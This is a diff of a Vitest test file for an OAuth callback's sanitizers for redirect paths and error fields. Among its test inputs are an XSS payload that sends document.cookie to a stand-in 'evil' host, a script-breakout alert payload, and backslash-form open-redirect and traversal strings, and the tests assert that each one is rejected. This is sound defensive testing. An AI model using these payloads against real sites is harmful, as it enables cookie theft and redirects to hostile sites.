@@ -2,10 +2,12 @@ import { describe, expect, it } from "vitest";
 
 import {
   AUTH_FLOWS,
+  DEFAULT_NEXT,
   buildHashForwardHtml,
   escapeHtmlAttribute,
   sanitizeAuthFlow,
   sanitizeErrorCode,
+  sanitizeErrorDescription,
   sanitizeNextPath,
 } from "./oauthCallback";
 
@@ -16,40 +18,46 @@ import {
 const XSS_NEXT = "/a</script><script>fetch('//evil/'+document.cookie)</script>";
 const XSS_ERROR_CODE = "</script><script>alert(1)</script>";
 
+// The rejection cases assert DEFAULT_NEXT rather than a literal, because what
+// they are about is "a hostile value becomes the default", not which route the
+// default happens to be -- Pass 5 moved it from /daily to / and the two are
+// different questions. `/infinite` carries the passthrough half: since the
+// default is now `/`, `sanitizeNextPath("/") === "/"` no longer distinguishes a
+// value that survived from one that was replaced.
 describe("sanitizeNextPath", () => {
   it("passes through the real routes the app actually sends", () => {
-    for (const path of ["/daily", "/infinite", "/online", "/how-to-play", "/privacy-policy", "/"]) {
+    for (const path of ["/", "/infinite", "/online", "/how-to-play", "/privacy-policy"]) {
       expect(sanitizeNextPath(path)).toBe(path);
     }
   });
 
   it("rejects the script-breakout payload", () => {
-    expect(sanitizeNextPath(XSS_NEXT)).toBe("/daily");
+    expect(sanitizeNextPath(XSS_NEXT)).toBe(DEFAULT_NEXT);
   });
 
   it("rejects protocol-relative open redirects, including the backslash form", () => {
     // `/\evil.com` passes a startsWith("//") check but the WHATWG URL parser
     // treats `\` as `/` for special schemes, so location.replace() navigates
     // off-site. This is the bug a `//`-only check misses.
-    expect(sanitizeNextPath("/\\evil.com")).toBe("/daily");
-    expect(sanitizeNextPath("//evil.com")).toBe("/daily");
-    expect(sanitizeNextPath("/\\/evil.com")).toBe("/daily");
+    expect(sanitizeNextPath("/\\evil.com")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("//evil.com")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("/\\/evil.com")).toBe(DEFAULT_NEXT);
   });
 
   it("rejects absolute URLs, traversal, embedded query/fragment and control characters", () => {
-    expect(sanitizeNextPath("https://evil.com")).toBe("/daily");
-    expect(sanitizeNextPath("/daily/../../etc")).toBe("/daily");
-    expect(sanitizeNextPath("/daily?next=/x")).toBe("/daily");
-    expect(sanitizeNextPath("/daily#frag")).toBe("/daily");
-    expect(sanitizeNextPath("/daily\n/x")).toBe("/daily");
-    expect(sanitizeNextPath("/dai ly")).toBe("/daily");
+    expect(sanitizeNextPath("https://evil.com")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("/infinite/../../etc")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("/infinite?next=/x")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("/infinite#frag")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("/infinite\n/x")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("/infin ite")).toBe(DEFAULT_NEXT);
   });
 
   it("falls back for missing or oversized input", () => {
-    expect(sanitizeNextPath(null)).toBe("/daily");
-    expect(sanitizeNextPath(undefined)).toBe("/daily");
-    expect(sanitizeNextPath("")).toBe("/daily");
-    expect(sanitizeNextPath(`/${"a".repeat(600)}`)).toBe("/daily");
+    expect(sanitizeNextPath(null)).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath(undefined)).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath("")).toBe(DEFAULT_NEXT);
+    expect(sanitizeNextPath(`/${"a".repeat(600)}`)).toBe(DEFAULT_NEXT);
   });
 });
 
@@ -84,7 +92,7 @@ describe("buildHashForwardHtml", () => {
     // The whole class of bug: any extra `</script` in the output means a
     // value escaped its element. Holds for hostile input because sanitizing
     // runs first, and for raw input because of attribute escaping.
-    const html = buildHashForwardHtml({ next: "/daily", errorCode: "oauth_callback_failed", nonce });
+    const html = buildHashForwardHtml({ next: "/", errorCode: "oauth_callback_failed", nonce });
     expect(html.match(/<\/script/gi)).toHaveLength(1);
   });
 
@@ -116,8 +124,48 @@ describe("buildHashForwardHtml", () => {
   });
 
   it("forwards the hash-only `error` key as well as `error_code`", () => {
-    const html = buildHashForwardHtml({ next: "/daily", errorCode: "oauth_callback_failed", nonce });
+    const html = buildHashForwardHtml({ next: "/", errorCode: "oauth_callback_failed", nonce });
     expect(html).toContain('hashParams.get("error_code") || hashParams.get("error")');
+  });
+
+  it("forwards error_description, encoded, without interpolating it", () => {
+    // The description is the only thing that tells a rate limit apart from a
+    // missing redirect URL -- both arrive as a bare `server_error` code. It is
+    // read from the hash at RUNTIME and encoded, so it never passes through the
+    // builder as a value and has no interpolation site to escape from.
+    const html = buildHashForwardHtml({ next: "/", errorCode: "oauth_callback_failed", nonce });
+
+    expect(html).toContain('hashParams.get("error_description")');
+    expect(html).toContain("encodeURIComponent(description");
+    // Still exactly one script element, which is the invariant this whole file
+    // exists to protect.
+    expect(html.match(/<\/script/gi)).toHaveLength(1);
+  });
+});
+
+describe("sanitizeErrorDescription", () => {
+  it("keeps a real GoTrue description readable", () => {
+    expect(sanitizeErrorDescription("Email rate limit exceeded")).toBe("Email rate limit exceeded");
+  });
+
+  it("collapses the whitespace GoTrue sends, including newlines", () => {
+    // These arrive `+`-encoded and sometimes multi-line; a description spread
+    // over three log lines is one nobody reads.
+    expect(sanitizeErrorDescription("  Unable to  exchange\r\nexternal   code  ")).toBe(
+      "Unable to exchange external code",
+    );
+  });
+
+  it("is absent rather than empty when there is nothing to say", () => {
+    // The caller omits the param entirely on null, so an empty-string
+    // description must not become `&error_description=`.
+    expect(sanitizeErrorDescription(null)).toBeNull();
+    expect(sanitizeErrorDescription("")).toBeNull();
+    expect(sanitizeErrorDescription("   \n  ")).toBeNull();
+  });
+
+  it("caps the length, so a hostile hash can't make an unusable URL", () => {
+    expect(sanitizeErrorDescription("x".repeat(500))).toHaveLength(200);
   });
 });
 
